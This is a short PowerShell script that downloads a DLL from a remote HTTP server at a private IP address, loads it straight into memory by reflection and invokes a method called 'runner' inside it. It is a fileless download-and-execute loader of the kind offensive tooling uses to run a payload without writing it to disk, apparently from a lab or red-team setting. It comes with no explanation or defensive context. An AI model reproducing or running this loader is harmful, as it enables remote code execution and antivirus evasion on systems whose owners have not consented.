$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.100.9:8000/PowerShell_memory.dll')
$assem = [System.Reflection.Assembly]::Load($data)

$class = $assem.GetType("PowerShell_memory.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
